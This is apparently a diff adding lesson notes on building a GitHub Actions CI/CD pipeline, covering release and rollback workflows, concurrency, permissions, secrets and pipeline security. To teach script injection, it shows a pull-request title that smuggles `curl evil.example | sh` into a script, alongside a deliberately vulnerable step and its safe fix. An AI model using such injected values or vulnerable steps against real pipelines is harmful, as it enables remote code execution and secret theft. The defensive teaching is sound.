@@ -1,0 +1,274 @@
+summary: >-
+  A CI/CD pipeline turns "it works on my machine" into a repeatable process. Every push runs
+  the same checks on a clean machine, and every change that passes on `main` is built into
+  one image and shipped by the same steps, first to staging, then to production. Nobody
+  deploys from a laptop, and every release can be traced to a commit.
+
+
+  The lesson built the skeleton: jobs ordered with `needs`, one image tagged with the
+  commit, environments and secrets. A pipeline that runs in production needs a few more
+  things. Two deploys must never overlap. The pipeline's own token should have the least
+  power it needs. A rollback should be one button. And the workflow file is code that runs
+  with your secrets, so it can be attacked like any other code.
+
+
+  These notes give a complete workflow that does all of that, checked with actionlint,
+  and the reasoning behind each line.
+remember:
+  - A pipeline is ordered stages where a failing stage stops everything after it, so a failed test can never reach production.
+  - Build once and deploy that same image everywhere, tagged with the commit, so production runs exactly what the tests passed.
+  - Give production deploys a concurrency group, so two deploys never run at once and finish in the wrong order.
+  - Set `permissions` explicitly and grant each job only what it needs, because the default token can do more than a test job should.
+  - Never put `${{ github.event... }}` text from a pull request straight into a `run` script; pass it through an environment variable to stop script injection.
+  - Workflows triggered from forks get no secrets, and `pull_request_target` gives them back, so never run a fork's code under it.
+  - A rollback is a deploy of an older commit's image, so make it a workflow you can run with one input.
+  - Continuous delivery keeps every change ready and a person approves production; continuous deployment ships every passing change automatically.
+sections:
+  - title: A complete release workflow
+    body: |-
+      This workflow tests every pull request and every push, and only builds and deploys
+      pushes to `main`. It passed actionlint 1.7.12.
+
+      ```yaml
+      name: release
+
+      on:
+        pull_request:
+        push:
+          branches: [main]
+
+      concurrency:
+        group: release-${{ github.ref }}
+        cancel-in-progress: ${{ github.event_name == 'pull_request' }}
+
+      permissions:
+        contents: read
+
+      jobs:
+        test:
+          runs-on: ubuntu-latest
+          timeout-minutes: 15
+          steps:
+            - uses: actions/checkout@v7
+            - uses: actions/setup-node@v6
+              with:
+                node-version: 24
+                cache: npm
+            - run: npm ci
+            - run: npm run lint
+            - run: npm test
+
+        build:
+          needs: test
+          if: github.event_name == 'push'
+          runs-on: ubuntu-latest
+          permissions:
+            contents: read
+            packages: write
+          steps:
+            - uses: actions/checkout@v7
+            - name: Log in to the registry
+              run: echo "$TOKEN" | docker login ghcr.io -u "${{ github.actor }}" --password-stdin
+              env:
+                TOKEN: ${{ secrets.GITHUB_TOKEN }}
+            - run: docker build -t ghcr.io/${{ github.repository }}:${{ github.sha }} .
+            - run: docker push ghcr.io/${{ github.repository }}:${{ github.sha }}
+
+        deploy-staging:
+          needs: build
+          runs-on: ubuntu-latest
+          environment: staging
+          steps:
+            - uses: actions/checkout@v7
+            - run: ./deploy.sh "${{ github.sha }}"
+              env:
+                DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
+
+        deploy-production:
+          needs: deploy-staging
+          runs-on: ubuntu-latest
+          environment: production
+          concurrency:
+            group: deploy-production
+            cancel-in-progress: false
+          steps:
+            - uses: actions/checkout@v7
+            - run: ./deploy.sh "${{ github.sha }}"
+              env:
+                DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
+      ```
+
+      The top-level `concurrency` cancels an older run of the same pull request when you push
+      again, which saves minutes, but never cancels a run on `main`. `permissions: contents:
+      read` makes the built-in `GITHUB_TOKEN` read-only by default. Only `build` gets
+      `packages: write`, to push to GitHub's registry. Once a job lists any permission, the
+      ones it doesn't list are off.
+
+      `cache: npm` in `setup-node` caches npm's download folder, keyed on the lockfile.
+      `timeout-minutes` stops a hung test from burning hours. `DEPLOY_KEY` lives in each
+      environment, so staging's job can't read production's key.
+  - title: One deploy at a time, and rollback as a button
+    body: |-
+      Two merges a minute apart start two pipelines. Without control, their deploy jobs can
+      overlap, and the older commit can finish last and win. The job-level `concurrency`
+      group above fixes that. A group allows one running job and one pending. When a third
+      arrives, the pending one is cancelled in its favour, so production skips straight to
+      the newest commit. `cancel-in-progress: false` means a deploy that has started is
+      never killed halfway.
+
+      Rollback reuses the same deploy script with an older commit. Put it in a workflow you
+      can start from the Actions tab with `workflow_dispatch`.
+
+      ```yaml
+      name: rollback
+
+      on:
+        workflow_dispatch:
+          inputs:
+            sha:
+              description: Commit whose image to deploy
+              required: true
+              type: string
+
+      permissions:
+        contents: read
+
+      jobs:
+        deploy-production:
+          runs-on: ubuntu-latest
+          environment: production
+          concurrency:
+            group: deploy-production
+            cancel-in-progress: false
+          steps:
+            - uses: actions/checkout@v7
+            - run: ./deploy.sh "$SHA"
+              env:
+                SHA: ${{ inputs.sha }}
+                DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
+      ```
+
+      It shares the `deploy-production` group, so a rollback waits for a running deploy
+      instead of racing it. It uses the `production` environment, so it gets the same
+      secrets and, if you set one, the same required reviewer. Nothing is rebuilt: the
+      image for that commit is already in the registry. That's what makes rollback take
+      seconds, and why registries shouldn't delete old tags too eagerly.
+
+      The input travels through `env` rather than being pasted into the script, for the
+      reason the next section explains.
+  - title: The pipeline is an attack surface
+    body: |-
+      A workflow runs code with your deploy keys in reach. Attackers know that, and several
+      real supply-chain incidents started in CI.
+
+      **Script injection.** `${{ }}` is replaced with text *before* the shell runs. A pull
+      request titled `"; curl evil.example | sh; echo "` becomes part of your script.
+
+      ```yaml
+      on: pull_request
+      jobs:
+        greet:
+          runs-on: ubuntu-latest
+          steps:
+            - run: echo "Checking ${{ github.event.pull_request.title }}"
+            - run: echo "Checking $TITLE"
+              env:
+                TITLE: ${{ github.event.pull_request.title }}
+      ```
+
+      actionlint flagged the first step: `"github.event.pull_request.title" is potentially
+      untrusted. avoid using it directly in inline scripts`. The second is safe, because the
+      shell reads `$TITLE` as data. Titles, branch names, issue bodies and commit messages
+      are all attacker-controlled.
+
+      **`pull_request_target`.** It runs in the context of your repository, with secrets and
+      a token that can write, even for a pull request from a fork. That's useful for adding
+      labels. It's dangerous the moment the job checks out and runs the fork's code, since
+      that code now has your secrets.
+
+      **Third-party actions.** `uses: some/action@v3` runs whatever that tag points to
+      today. A compromised maintainer can move the tag. Pinning to a full commit hash
+      freezes the code, and a tool such as Dependabot can raise updates for review.
+
+      **Long-lived cloud keys.** Instead of storing a cloud access key as a secret, a job
+      with `permissions: id-token: write` can ask GitHub for a short-lived signed token,
+      and the cloud provider trades it for temporary credentials. The trust can be limited
+      to one repository and one environment, and there's no key to leak.
+  - title: Fast feedback and a green main
+    body: |-
+      A pipeline nobody waits for is a pipeline people work around. Aim for the test stage
+      of a pull request to finish in under ten minutes.
+
+      Order checks so the cheapest failures come first: lint and type checks take seconds and
+      catch a large share of mistakes. Unit tests next, then integration tests against a
+      real database in a service container, then the slow end-to-end journey. Jobs that
+      don't depend on each other run in parallel, so split a slow suite across jobs rather
+      than running it in one long line.
+
+      Cache what's downloaded, not what's built from your code. A dependency cache keyed on
+      the lockfile is safe. A cached build output keyed loosely can hide a broken build.
+
+      Make the pipeline the gate. Branch protection with required status checks stops a
+      pull request merging until the test job passes, which makes `main` always deployable.
+      That's the premise of trunk-based development: short-lived branches, merged often,
+      with an always-green `main`.
+
+      Flaky tests are a pipeline bug. A test that fails one run in twenty teaches people to
+      press "re-run" without reading, and then a real failure gets re-run too. Fix it, or
+      move it out of the required checks with an owner and a date.
+
+      Finally, the deploy job isn't done when the command returns. End it with a smoke test
+      against the new version, such as a request to `/ready` and one real read. A failing
+      smoke test fails the pipeline, and in the releases lesson it triggers the rollback.
+pitfalls:
+  - "**Rebuilding the image in the deploy job.** The rebuild can pull different package versions, so production runs something no test saw. Build once, push by commit tag, and deploy that tag."
+  - "**No concurrency group on deploys.** Two pipelines overlap and the older commit can land last. Put every production deploy, including rollbacks, in one group."
+  - "**Leaving the token with default permissions.** Every step, including third-party actions, can then write to the repository. Set `permissions: contents: read` at the top and grant more per job."
+  - "**Pasting event text into `run`.** A pull request title or branch name becomes shell code. Pass it through `env` and quote the variable."
+  - "**Running fork code under `pull_request_target`.** It hands a stranger your secrets and a write token. Use `pull_request` for anything that runs the contributor's code."
+  - "**One secret for every environment.** A staging job, or a bug in staging's scripts, can then deploy to production. Store keys per environment and require a reviewer on production."
+  - "**Treating a green deploy command as a successful release.** The command can succeed while the app fails to start. End with a smoke test that can fail the job."
+interview:
+  - question: Describe a CI/CD pipeline you'd set up for a web service, from pull request to production.
+    answer: >-
+      Every pull request runs lint, type checks and tests on a fresh runner, and branch
+      protection blocks the merge until they pass. On merge to `main`, the pipeline tests
+      again, builds one container image tagged with the commit hash and pushes it to a
+      registry. It deploys that image to staging, runs a smoke test, then deploys the same
+      image to production, behind a required reviewer if we want delivery rather than
+      continuous deployment. Deploy jobs share a concurrency group so they never overlap,
+      secrets are scoped per environment, and the token is read-only by default. Rollback
+      is a manual workflow that deploys an earlier commit's image. The trade-off in the
+      reviewer gate is safety against speed of shipping.
+  - question: Why "build once, deploy many"? What goes wrong if each environment builds its own image?
+    answer: >-
+      Because an artefact you rebuild isn't the artefact you tested. A second build can
+      resolve a newer base image or a different transitive dependency, pick up a changed
+      build argument, or run on a different builder, so staging and production diverge in
+      ways nobody reviewed. With one image tagged by commit, the digest that passed staging
+      is byte for byte what production runs, and rollback is a redeploy of a known digest.
+      Configuration that differs per environment comes in at run time, through environment
+      variables and secrets, never baked into the image. The cost is a registry to run and
+      retention rules for old images.
+  - question: How do you keep secrets safe in a CI system?
+    answer: >-
+      Keep them out of the repository, scope them tightly, and assume any code in the job
+      can read them. Secrets live in the platform's encrypted store, per environment, so
+      only production jobs see production keys, and production can require an approval. The
+      built-in token is read-only unless a job needs more. Forked pull requests get no
+      secrets, and I never run their code under `pull_request_target`. Event text goes
+      through `env` to prevent script injection, and third-party actions are pinned to
+      commit hashes. Where the cloud supports it, I replace stored keys with OIDC so the job
+      gets short-lived credentials. Masking in logs helps but isn't a guarantee: an encoded
+      secret prints in clear.
+  - question: What's the difference between continuous delivery and continuous deployment, and which would you choose?
+    answer: >-
+      With continuous delivery every passing change is built and ready to release, and a
+      person decides when production gets it. With continuous deployment every passing change
+      goes to production automatically. I'd aim for deployment when the safety net is strong:
+      good tests, small changes, health-gated releases, automatic rollback and monitoring
+      that catches regressions quickly. Small, frequent releases make each one less risky
+      and easier to diagnose. I'd keep a manual gate where a release has consequences
+      tests can't catch, such as a regulated system, a mobile app store release, or a team
+      still building its test suite. The gate costs speed and tends to batch changes, which
+      makes releases bigger.
